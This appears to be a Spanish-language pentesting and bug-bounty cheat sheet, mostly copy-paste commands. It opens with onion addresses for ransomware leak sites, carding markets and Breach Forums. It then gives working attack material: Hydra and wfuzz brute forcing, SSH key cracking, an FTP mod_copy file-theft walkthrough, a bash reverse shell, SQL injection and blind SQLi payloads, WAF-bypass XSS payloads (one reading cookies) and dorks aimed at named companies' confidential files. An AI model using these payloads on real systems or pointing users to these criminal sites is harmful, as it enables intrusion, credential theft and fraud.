# ***III. Dark Web***

## 6.1.Wiki

   - The Hidden Wiki
   ```bash
   http[:]//zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad[.]onion/wiki/Main_Page
   ```
   - OnionLinks
   ```bash
   http[:]//jaz45aabn5vkemy4jkg4mi4syheisqn2wn2n4fsuitpccdackjwxplad[.]onion/
   ```

## 6.2.Ransomware Group

   - Ransomware Group Sites
   ```bash
   http[:]//ransomwr3tsydeii4q43vazm7wofla5ujdajquitomtd47cxjtfgwyyd[.]onion/
   ```
   - RansomHub
   ```bash
   http[:]//ransomxifxwc5eteopdobynonjctkxxvap77yqifu2emfbecgbqdw6qd[.]onion//#ShootingHouse
   ```
   - INC Ransom
   ```bash
   incblog7vmuq7rktic73r4ha4j757m3ptym37tyvifzp2roedyyzzxid[.]onion/blog/leaks
   ```
   - Rhysida
   ```bash
   rhysidafohrhyy2aszi7bm32tnjat5xri65fopcxkdfxhi4tidsg7cad[.]onion  / http[:]//rhysidafc6lm7qa2mkiukbezh7zuth3i4wof4mh2audkymscjm6yegad[.]onion/
   ```
   - Lockbit 3 (blog)
   ```bash
   http[:]//lockbit3753ekiocyo5epmpy6klmejchjtzddoekjlnt6mu3qh4de2id[.]onion/
   ```
   - Everest
   ```bash
   http[:]//ransomocmou6mnbquqz44ewosbkjk3o5qjsl3orawojexfook2j7esad[.]onion/
   ```
   - RansomEXX
   ```bash
   http[:]//rnsm777cdsjrsdlbs4v5qoeppu3px6sb2igmh53jzrx7ipcrbjz5b2ad[.]onion/
   ``` 

## 6.3.Otros
   
   - Black Market CC
   ```bash
   http[:]//imjxsmcdedgtljeqip5vmqjepruvlip2xstuos5phwsrp3ka3znzn2ad[.]onion/
   ```
   - CARDS
   ```bash
   http[:]//nalr2uqsave7y2r235am5jsfiklfjh5h4jc5nztu3rzvmhklwt5j6kid[.]onion/list.html
   ```
   Black Hat Chat
   ```bash
   http[:]//blkhatjxlrvc5aevqzz5t6kxldayog6jlx5h7glnu44euzongl4fh5ad[.]onion/
   ```
   Facebook
   ```bash
   http[:]//4wbwa6vcpvcr3vvf4qkhppgy56urmjcj2vagu2iqgp3z656xcmfdbiqd[.]onion/
   ```
   Massive List Onion Service
   ```bash
   http[:]//darknetlidvrsli6iso7my54rjayjursyw637aypb6qambkoepmyq2yd[.]onion/onions
   ```
## 6.4.Breach Forums
   ```bash
   https://breachforums.st/member.php
   ```
   ```bash
   breached26tezcofqla4adzyn22notfqwcac7gpbrleg4usehljwkgqd[.]onion
   ```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------










## 1.2.Gobuster

1. Para realizar ataques de **fuerza bruta** contra URI (directorios y archivos), subdominios DNS y nombres de host virtuales

   ```bash
   gobuster -u http://example.com -w wordlist.txt dir
   ```
   ```bash
   gobuster dir -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
   ```

## 1.3.wfuzz

1. Para realizar ataques de **fuerza bruta** en APIs

   ```bash
   wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login --hc 405
   ```

## 1.4.ffuz

1. Evitar WAFs y obtener buenos resultados en errores de divulgación de información

   ```bash
   ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json
   ```

## 1.5.Httpx 

1. Utilizar **Httpx** para encontrar **LFI**. Este comando que le mostrará todas las urls vulnerables lfi en la pantalla, básicamente etc/passwd archivo de contraseña en la respuesta y mostrar todas las urls en la pantalla.

   ```bash
   echo 'https://ejemplo.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\|\$[^\:]):0:0:"
   ```
   
## 1.6.Hydra

1. Para realizar ataques de **fuerza bruta** de contraseñas FTP, SSH

   ```bash
   hydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt -vV <TARGET_IP> ftp
   ```
   ```bash
   hydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt -vV <TARGET_IP> ssh
   ```
   ```bash
   hydra -l <username> -P passlist.txt ftp://<TARGET_IP>
   ```
   ```bash
   hydra -l <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
   ```
   ```bash
   hydra -l <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "login/:username=^USER^&password=^PASS^:F=incorrect" -V
   ```

## 1.7.Enum4linux: SMB

1. Enum4linux es una herramienta que se utiliza para enumerar recursos compartidos SMB tanto en sistemas Windows como Linux. Opciones **-U** (get userlist), **-M** (get machine list), **-N** (get namelist dump (different from -U and-M)), **-S**  (get sharelist), **-P**  (get password policy information), **-G** (get group and member list) and **-a** (all of the above (full basic enumeration)).

   ```bash
   enum4linux -a <TARGET_IP> 
   ```

2. Para acceder de forma remota al recurso compartido SMB

   ```bash
   smbclient //<TARGET_IP>/<SHARE>
   ```

3. Otra forma de enumera con nmap

   ```bash
   nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <TARGET_IP>
   ```

4. Descargar de forma recursiva el recurso compartido SMB

   ```bash
   smbget -R smb://<TARGET_IP>/<SHARE>
   ```

5. Para saber que montajes podemos ver

   ```bash
   nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <TARGET_IP> 
   ``` 

## 1.8.Rockyou

1. Descomprimir

   ```bash
   gzip -d /usr/share/wordlists/rockyou.txt.gz
   ```

## 1.9.SSH

1. Realizar un conexión remota

   ```bash
   ssh user@<TARGET_IP>
   ```
   ```bash
   ssh -oHostKeyAlgorithms=+ssh-rsa user@<TARGET_IP>
   ```

2. Realizar un conexión remota mendiante id_rsa

   Primer ver si se puede ver el archivo ocult id_rsa de la ruta del otro usuario
   ```bash
   ls /home/<username>/.ssh
   ```
   Si se puede ver, copiar el contenido de id_rsa en un archivo de la maquina del pentester
   ```bash
   cat id_rsa 
   ```
   Dar permiso de ejecución.
   ```bash
   chmod +x id_rsa
   ```
   Obtener el hash del fichero id_rsa usando **ssh2john**
   ```bash
   /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
   ```
   Realizar fuerza bruta al hash obtenido del fichero id_rsa.hash usando **John The Riper**
   ```bash
   sudo john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
   ```
   Finalmente conectarse de esta forma y le solicitara ingresar la contraseña para la clave 'id_rsa'.
   ```bash
   sudo ssh -i id_rsa <username>@<TARGET_IP>
   ```

## 1.10.NSF

1. Montar NFS compartidos

   ```bash
   sudo mount -t nfs IP:share /tmp/mount/ -nolock
   ```

## 1.11.FTP

1. Vulnerabilidad en modulo mod_Copy

   - El módulo mod_copy implementa los comandos SITE CPFR y SITE CPTO , que se pueden utilizar para copiar archivos o directorios de un lugar a otro en el servidor. Cualquier cliente no autenticado puede utilizar estos comandos para copiar archivos desde cualquier  parte del sistema de archivos a un destino elegido.
   - Ejecutamos netcat al puerto 21
   ```bash
   nc 10.10.197.227 21
   ```
   - Escribimos SITE CPRF y apuntamos la ruta del id_rsa
   ```bash
   SITE CPFR /home/kenobi/.ssh/id_rsa
   ```
   - Y lo copiamos al temp donde tenemos permisos
   ```bash
   SITE CPTO /var/tmp/id_rsa
   ```
   - Montemos el directorio /var/tmp en nuestra máquina.
   ```bash
   mkdir /mnt/kenobiNFS
   mount 10.10.197.227:/var /mnt/kenobiNFS
   ls -la /mnt/kenobiNFS
   ```


## 1.12.Linux: Privilege escalation

1. Buscar permisos en todos los archivos SUID:
   - Los bits SUID pueden ser peligrosos, algunos binarios como passwd    necesitan ejecutarse con privilegios elevados (ya que restablece su contraseña en el sistema), sin embargo, otros archivos personalizados que tengan el bit SUID pueden generar todo tipo de problemas.


   ```bash
   find / -user root -perm -4000 -exec ls -ldb {} \; 
   ```
   ```bash
   find / -perm -u=s -exec ls -l {} \; 2>/dev/null 
   ```
   ```bash
   find / -perm -u=s -type f 2>/dev/null 
   ```


## 1.13.Data Base: SQL, MYSQL, SQLITE, PhpMyAdmin

1. Leear archivos sqlite
   
   ```bash
   sqlite3 example.db
   sqlite> .tables
   sqlite> PRAGMA table_info(customers);
   sqlite> SELECT * FROM customers;
   ```

2. Si encuentra alguna página phpmyadmin, simplemente omítala con la página de configuración de instalación Ejemplo: https://www.ejmplo.com/phpmyadmin/.

   - Omisión pegar ***/setup/index.php/setup/index.php?page=servers&mods=test&id=test*** después de phpmyadmin/ La mayoría de las veces, debido a una mala configuración de seguridad, se abre la página de configuración principal, así que simplemente repórtelo al programa de recompensas y gane una buena cantidad de recompensa
   ```bash
   https://www.ejemplo.com/media/phpmyadmin/setup/index.php/setup/index.php?page=servers&mods=test&id=test.
   ```
   

## 1.14.Linux: Comandos mas usados

1. Para trasnferir archivos usando nc

   Ejecutar en el host donde va a pasar los archivos
   ```bash
   nc -l -p 1234 > LinEnum.sh 
   ```
   Ejecutar host donde estan los archvios
   ```bash
   cat /home/user/tools/privesc-scripts/LinEnum.sh | nc 10.9.2.251 1234
   ```

2. Para trasnferir archivos usando python3 y wget o curl

   Ejetuar en donde estan los archivos
   ```bash
   python3 -m http.server 8080 
   ```
   Ejecutar en donde descargar los archivos
   ```bash
   wget http://10.9.2.251:8080/lse.sh -O /home/sn0w/lse.sh 
   ```
   ```bash
   curl -o /home/sn0w/lse.sh http://10.9.2.251:8080/lse.sh 
   ```
3. Encontrar archivos

   ```bash
   find -name passwords.txt 
   ```
   ```bash
   find -name *.txt 
   ```
 4. Poner en escucha con netcat

   ```bash
   nc -nlvp 4444
   ```
 5. Crear una reverse shell TCP

   ```bash
   /bin/bash -c 'bash -i >& /dev/tcp/10.9.2.251/4444 0>&1'
   ``` 

## 1.15.Sitios Web

1. Para descifrar hashes de contraseñas débiles

   ```bash
   https://crackstation.net/
   ```
2. Para buscar exploit's

   ```bash
   https://www.exploit-db.com/exploits/
   ```
3. Para buscar CVE's

   ```bash
   https://nvd.nist.gov/vuln/search
   ```
   ```bash
   https://cve.mitre.org/
   ```
   ```bash
   https://www.cvedetails.com/
   ```
4. Para codificar y decodificar

   ```bash
   https://gchq.github.io/CyberChef/
   ```
   ```bash
   https://appdevtools.com/base64-encoder-decoder
   ```

# ***II. Bug bounty - Notes***

`Bug bounty notes` es una documento donde encontraras comandos para ayudarte rapidamente a realizar Bug bounty desde lo mas básico a lo avanzado.

## 2.1.Katana

1. Para encontrar documentos confidenciales, sensibles y a datos de PII.

   ```bash
   katana -u subdomainsList -em pdf,docx | tee endpointsPDF_DOC
   ```
   ```bash
   grep -i 'redacted.*\.pdf$' endpointsPDF_DOC | sed -E 's/[-_]?redacted//gi' | sort -u | httpx -mc 200 -sc
   ```

2. Enumerar de forma pasiva todos los puntos finales de un sitio web.

   ```bash
   echo ejemplo.com | katana -passive -f qurl -pss waybackarchive,commoncrawl,alienvault | httpx -mc 200 | grep -E '\.(js|php)$' | tee specificEndpoints
   ```

## 2.2.Nuclei

1. Para detectar sitios web de phishing.

   ```bash
   nuclei -l websites_Possible_Phishing -tags phishing -itags phishing
   ```
   
2. Plantilla para wordpress de divulgación que contiene información tan senstive que cuentan como P1. Sólo tiene que ejecutar esta plantilla en todos los subdominios bbp (bug bounty program). El template **wp-setup-config.yaml** se encuentra en el repositorio.

   ```bash
   echo 'https://speedtest.ejemplo.com/' | nuclei -t nuclei-template/wp-setup-config.yaml
   ```
    ```bash
   subfinder -d example.com -all | httpx-toolkit | nuclei -t nuclei-template/wp-setup-config.yaml
   ```
   
      
## 2.3.XSS Reflejado

1. XXS reflejado con zero click en un '<'input'>' vulnerable

   ```bash
   hola" " onfocus="alert(document.domain)" autofocus="
   ```

## 2.4.XSS Almacenado

1. Crea un fichero en linux y luego sube ese archivo a través de un cargador, tendrás un XSS almacenado si el nombre del archivo está almacenado y el desarrollador se ha olvidado de desinfectar este campo.

   ```bash
   touch '"><img src=x onerror=alert("xss!")>.pdf'
   ```
   
## 2.5.SQL Injection

1. SQL Injection.
   
   Ejemplo: En el campo email_user='+||+(1)=(1)+LiMiT+1--+-$pwd=123
   ```bash
   '+||+(1)=(1)+LiMiT+1--+-
   ```

   Ejemplo: GET http:....../order=nombre&sort=-1+OR+IF(MID(version(),1,5)='5.7.2',BENCHMARK(900000,SHA1(1)),1)--
   ```bash
   -1+OR+IF(MID(version(),1,5)='5.7.2',BENCHMARK(900000,SHA1(1)),1)--
   ```
   Otros
   ```bash
   '%2BIF(MID(version(),1,6)='10.3.2',sleep(5),v))%2B'
   ```
  
## 2.6.SQL Injection Blind

1. Blind SQL Injection MySQL.
   Ejemplo: En la cabecera GET
   ```bash
   -1+OR+IF(1%3d1,+(SELECT+1+FROM+(SELECT+SLEEP(MID(version(),1)))+AS+v),+0)
   ```
   Ejemplo: search='OR+(SELECT+1+FROM+(SELECT(SLEEP(MID(version(),1,1))))test)+OR+'.test'='.test
   ```bash
   'OR+(SELECT+1+FROM+(SELECT(SLEEP(MID(version(),1,1))))test)+OR+'.test'='.test
   ```

2. Blind SQL PostgreSQL.

   Ejemplo: GET /pagina.php?valor=(SELECT+1+FROM+pg_sleep((ASCII((SELECT+datname+FROM+pg_database+LIMIT+1))+-+32)+/+2))
   ```bash
   (SELECT+1+FROM+pg_sleep((ASCII((SELECT+datname+FROM+pg_database+LIMIT+1))+-+32)+/+2))
   ```
   
## 2.7.PureDNS

1. Resolver/forzar mediante DNS

   ```bash
   puredns bruteforce best-dns-wordlist.txt dominio.com -r resolvers.txt -w dns | httpx -mc 200 -o subdomain_output.txt 
   ```

## 2.8.Azure Active Directory

1. Enumeración dominios y subdominios con AADInternals en PowerShell (aplica solo si la empresa utiliza Azure AD, de lo contario esta técnica es inútil).

   ```bash
   PS C:\WINDOWS\system32> Get-AADIntTenantDomains -Domain cisco.onmicrosoft.com
   ```

## 2.9.AWS

1. Detectar configuraciones incorrectas y vulnerabilidades en nube (especificamente en AWS, detecta buckets de S3 e instancias EC2 mal configurados).

   ```bash
   nuclei -config ~/nuclei-templates/profiles/aws-cloud-config.yml -s critical,high --silent
   ```

2. Control de un bucket de S3

   ```bash
   echo EJEMPLO.COM | cariddi | grep js | tee js_files | httpx -mc 200 | nuclei -tags aws,amazon
   ```
   
## 2.10.Bypass WAF

1. **XSS payloads**.

   ```bash
   "><img/src=%20only=1%20OnErRor=x=alert`XSS`><!--
   ```
   ```bash
   "><details/open/id="&XSS"ontoggle​=alert("XSS_WAF_BYPASS_:-)")>
   ```
   ```bash
   "><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
   ```
   ```bash
   1'"();<test><ScRiPt >window.alert("XSS_WAF_BYPASS")</ScRiPt>
   ```
   ```bash
   "><input%0a%0atype="hidden"%0a%0aoncontentvisibilityautostatechange=confirm(/paulportanc/)%0d%0astyle=content-visibility:auto>
   ```
   ```bash
   "><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
   ```
   ```bash
   <p oncontentvisibilityautostatechange="alert(/FirefoxOnly/)" style="content-visibility:auto">
   ```
   
## 2.11.Shodan

1. Obtener todas las IPs de Shodan sin ninguna cuenta premium

   - Una vez estando en Shodan en Facet Analysis, precionar F12 e ir a Console y escribir: **allow pasting**
   - Copiar el siguiente código
   ```bash
   var ipElements=document.querySelectorAll('strong');var ips=[];ipElements.forEach(function(e){ips.push(e.innerHTML.replace(/["']/g,''))});var ipsString=ips.join('\n');var a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(ipsString);a.download='shodanips.txt';document.body.appendChild(a);a.click();
   ```
   
## 2.12.APIs

1. Enumerar la superficie de ataque, obtener API KEYS y puntos finales de API en Móviles.

   - Descarga el .apk usando APKCombo o APKPure.
   - Escaneo de archivos APK en busca de URI, puntos finales y secrets:
   ```bash
   apkleaks -f com.EJEMPLO.COM.apk -o output_endpoints_apikeys
   ```
   - Validar API KEY encontrada con nuclei:
   ```bash
   nuclei -t nuclei-templates/http/token-spray -var token=<API_KEY_FOUND>
   ```

2. Fuerza bruta.

   ```bash
   wfuzz -d '{"email":"hapihacker@email.com", "otp":"FUZZ","password":"NewPassword1"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/SecLists-master/Fuzzing/4-digits-0000-9999.txt -u http://crapi.apisec.ai/identity/api/auth/v2/check-otp --hc 500
   ```
   
## 2.13.Google Dorks

1. Para encontrar datos de PII o información reservada para los procesos de negocio.

   ```bash
   site:*.EJEMPLO.COM (ext:doc OR ext:docx OR ext:pdf OR ext:rtf OR ext:ppt OR ext:csv OR ext:xls) (intext:confidential OR intext:privileged OR intext:unredacted OR intext:secret OR intext:reserved)
   ```
2. Para encontrar errores en SQLi.

   ```bash
   site:testphp.vulnweb.com intext:"sql syntax near" OR intext:"syntax error" OR intext:"unexpected end of SQL" OR intext:"Warning: mysql_" OR intext:"pg_connect()" OR intext:"error in your SQL syntax" OR intext:"OLE DB Provider for SQL Server"
   ```
   ```bash
   site:*.dell.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
   ```

## 2.14.Gau

1. Encontrar información Divulgación (***Information Disclosure***): Expresión regular.
   
   - Instalación de gau https://github.com/lc/gau
   ```bash
   git clone https://github.com/lc/gau.git; \
   cd gau/cmd; \
   go build; \
   sudo mv gau /usr/local/bin/; \
   gau --version;
   ```

   - Para usar la expresión regular, use los siguientes comandos:
   ```bash
   echo https://sksc.somaiya.edu | gau | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"
   ```
   ```bash 
   echo https://sksc.somaiya.edu | gau | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"
   ```
   
# ***V. Metodologia SQL Injection***

1. Buscará directamente todos los subdominios basados ​​en **php**, **asp**, **jsp**, **jspx**, **aspx**.

   - Para múltiples subdominios:
   ```bash
   subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
   ```
   - Para un solo dominio:
   ```bash
   subfinder -d ejemplo.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
   ```

   



